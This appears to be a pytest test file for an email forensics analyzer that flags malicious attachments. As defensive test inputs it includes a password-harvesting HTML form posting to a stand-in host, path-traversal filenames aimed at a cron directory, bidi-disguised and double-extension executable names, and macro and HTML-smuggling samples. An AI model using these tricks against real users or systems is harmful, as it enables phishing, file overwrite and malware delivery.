import json
import os
import stat

from email_forensics.analyzer import analyze_file
from email_forensics.attachments import analyze_attachments
from email_forensics.loader import parse_bytes
from email_forensics.mime import walk_mime
from samples import (SMUGGLING_HTML, fake_docm, fake_pe, fake_remote_template_docx, make_zip,
                     message_with)


def run(attachments, body="See attached."):
    raw = message_with(attachments, body)
    atts, findings = analyze_attachments(walk_mime(parse_bytes(raw)))
    return atts, {f.code for f in findings}, findings


def test_hashes_and_detection():
    atts, _, _ = run([("report.pdf", "application/pdf", b"%PDF-1.4 x")])
    [att] = atts
    assert att.detected_type == "pdf" and att.extension == "pdf" and not att.inline
    import hashlib
    assert att.sha256 == hashlib.sha256(b"%PDF-1.4 x").hexdigest()
    assert len(att.md5) == 32 and len(att.sha1) == 40


def test_benign_attachments_have_no_warnings():
    _, codes, _ = run([
        ("report.pdf", "application/pdf", b"%PDF-1.4 x"),
        ("photo.jpg", "image/jpeg", b"\xff\xd8\xff\xe0 jpeg"),
        ("photo2.jpg", "image/jpeg", b"\x89PNG\r\n\x1a\n png named jpg"),  # common, harmless
        ("notes.txt", "text/plain", b"hello"),
        ("data.zip", "application/zip", make_zip({"a.csv": b"1,2"})),
    ])
    assert codes == set()


def test_executable_by_extension_and_content():
    _, codes, _ = run([("setup.exe", "application/octet-stream", fake_pe())])
    assert "ATT_EXECUTABLE" in codes
    _, codes, findings = run([("invoice.pdf", "application/pdf", fake_pe())])
    assert {"ATT_EXECUTABLE", "ATT_TYPE_MISMATCH", "ATT_DECLARED_TYPE_MISMATCH"} <= codes
    mismatch = next(f for f in findings if f.code == "ATT_TYPE_MISMATCH")
    assert mismatch.severity.value == "high"


def test_filename_tricks():
    _, codes, _ = run([("invoice.pdf.exe", "application/octet-stream", b"x")])
    assert "ATT_DOUBLE_EXTENSION" in codes
    _, codes, _ = run([("invoice.pdf          .exe", "application/octet-stream", b"x")])
    assert "ATT_FILENAME_PADDING" in codes
    _, codes, _ = run([("photo_‮gpj.scr", "image/jpeg", b"x")])
    assert "TEXT_BIDI_CONTROL" in codes
    _, codes, _ = run([("../../evil.txt", "text/plain", b"x")])
    assert "ATT_FILENAME_PATH" in codes
    _, codes, _ = run([("report.v2.final.pdf", "application/pdf", b"%PDF-1.4")])
    assert "ATT_DOUBLE_EXTENSION" not in codes


def test_filename_conflict_between_headers():
    raw = (b'Content-Type: multipart/mixed; boundary="B"\n\n--B\nContent-Type: text/plain\n\nhi\n'
           b'--B\nContent-Type: application/pdf; name="invoice.pdf"\n'
           b'Content-Disposition: attachment; filename="invoice.exe"\n\nMZ\n--B--\n')
    _, findings = analyze_attachments(walk_mime(parse_bytes(raw)))
    assert "ATT_FILENAME_CONFLICT" in {f.code for f in findings}


def test_rfc2231_filename_is_decoded():
    raw = (b'Content-Type: multipart/mixed; boundary="B"\n\n--B\nContent-Type: text/plain\n\nhi\n'
           b"--B\nContent-Type: application/octet-stream\n"
           b"Content-Disposition: attachment; filename*=utf-8''rechnung%E2%80%AEfdp.exe\n\nx\n--B--\n")
    atts, findings = analyze_attachments(walk_mime(parse_bytes(raw)))
    assert atts[0].filename == "rechnung‮fdp.exe"
    assert {"TEXT_BIDI_CONTROL", "ATT_EXECUTABLE"} <= {f.code for f in findings}


def test_risky_formats():
    _, codes, _ = run([("disk.iso", "application/octet-stream", b"\x00" * 0x8001 + b"CD001")])
    assert "ATT_DISK_IMAGE" in codes
    _, codes, _ = run([("notes.one", "application/octet-stream", b"x")])
    assert "ATT_ONENOTE" in codes
    _, codes, _ = run([("q.docm", "application/octet-stream", fake_docm())])
    assert {"ATT_MACRO_EXTENSION", "ATT_OFFICE_MACRO"} <= codes
    _, codes, _ = run([("q.docx", "application/octet-stream", fake_remote_template_docx())])
    assert "ATT_REMOTE_TEMPLATE" in codes
    _, codes, _ = run([("x.rtf", "application/rtf", b"{\\rtf1{\\object\\objemb{\\objdata 0105}}}")])
    assert "ATT_RTF_OBJECT" in codes
    ole_vba = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 + "_VBA_PROJECT".encode("utf-16-le")
    _, codes, _ = run([("old.doc", "application/msword", ole_vba)])
    assert "ATT_OFFICE_MACRO" in codes


def test_html_attachment_and_smuggling():
    atts, codes, _ = run([("pay.html", "text/html", SMUGGLING_HTML)])
    assert {"ATT_HTML", "ATT_HTML_SMUGGLING", "HTML_SCRIPT"} <= codes
    _, codes, _ = run([("login.htm", "text/html",
                        b'<form action="https://evil.test/c"><input type="password"></form>')])
    assert {"ATT_HTML", "HTML_CREDENTIAL_FORM"} <= codes and "ATT_HTML_SMUGGLING" not in codes
    atts, codes, _ = run([("x.svg", "image/svg+xml", b'<svg><a href="http://1.2.3.4/x">x</a></svg>')])
    assert "URL_IP_HOST" in codes and atts[0].urls[0].url == "http://1.2.3.4/x"


def test_archive_findings():
    _, codes, _ = run([("a.zip", "application/zip", make_zip({"docs/Invoice.pdf.exe": fake_pe()}))])
    assert "ATT_ARCHIVE_RISKY_MEMBER" in codes
    _, codes, _ = run([("a.zip", "application/zip", make_zip({"../../etc/cron.d/x": b"x"}))])
    assert "ATT_ARCHIVE_PATH_TRAVERSAL" in codes
    _, codes, _ = run([("a.rar", "application/octet-stream", b"Rar!\x1a\x07\x00")])
    assert "ATT_ARCHIVE_UNINSPECTED" in codes


def test_encrypted_archive_escalates_with_password_in_body():
    zip_ = make_zip({"a.txt": b"x"}, encrypted={"a.txt"})
    raw = message_with([("a.zip", "application/zip", zip_)], body="Hi, the password is 4471.")
    from email_forensics.attachments import correlate_with_body
    _, findings = analyze_attachments(walk_mime(parse_bytes(raw)))
    enc = next(f for f in findings if f.code == "ATT_ENCRYPTED_ARCHIVE")
    assert enc.severity.value == "medium"
    correlate_with_body(findings, ["Hi, the password is 4471."])
    assert enc.severity.value == "high"


def test_malicious_fixture_end_to_end(fixture_path):
    report = analyze_file(fixture_path("malicious_attachments.eml"))
    codes = {f.code for f in report.findings}
    assert {"ATT_ARCHIVE_RISKY_MEMBER", "ATT_EXECUTABLE", "ATT_HTML_SMUGGLING", "ATT_OFFICE_MACRO",
            "TEXT_BIDI_CONTROL", "ATT_DECLARED_TYPE_MISMATCH", "ATT_ENCRYPTED_ARCHIVE"} <= codes
    enc = next(f for f in report.findings if f.code == "ATT_ENCRYPTED_ARCHIVE")
    assert enc.severity.value == "high"  # body gives the password
    assert len(report.attachments) == 5
    assert report.body.text_bodies[0].preview.startswith("Password for the archive")


def test_legit_and_phish_fixtures_have_no_attachments(fixture_path):
    for name in ("legit.eml", "phish_html.eml"):
        report = analyze_file(fixture_path(name))
        assert report.attachments == []
        assert not any(f.code.startswith("ATT_") for f in report.findings)


def test_extraction_is_safe(fixture_path, tmp_path):
    report = analyze_file(fixture_path("malicious_attachments.eml"), extract_dir=tmp_path)
    manifest = json.loads((tmp_path / "manifest.json").read_text())
    assert len(manifest) == 5
    for entry, att in zip(manifest, report.attachments):
        stored = tmp_path / entry["stored_as"]
        assert stored.name == f"{att.sha256}.bin"
        assert entry["original_filename"] == att.filename
        assert entry["source_email_sha256"] == report.evidence.sha256
        mode = stat.S_IMODE(os.stat(stored).st_mode)
        assert not mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH | stat.S_IWUSR)
    # Re-running into the same directory does not duplicate manifest entries.
    analyze_file(fixture_path("malicious_attachments.eml"), extract_dir=tmp_path)
    assert len(json.loads((tmp_path / "manifest.json").read_text())) == 5
